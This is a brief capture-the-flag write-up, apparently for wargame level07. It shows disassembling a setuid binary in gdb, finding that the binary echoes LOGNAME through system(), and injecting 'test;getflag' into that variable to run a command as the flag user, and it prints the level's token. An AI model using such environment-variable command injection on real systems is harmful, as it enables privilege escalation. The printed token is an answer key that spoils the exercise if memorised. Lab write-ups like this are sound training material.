We have a binary file. Let's decompile it

$> gdb ./level07

gdb - disas main

We see that the program use the getenv and et system funtions

if we check strings with x/s $eax we can se that the system function echo the env variable LOGNAME

so if we change this varibale with getflag the binary will execute it as flag07

$> LOGNAME="test;getflag"
$> ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
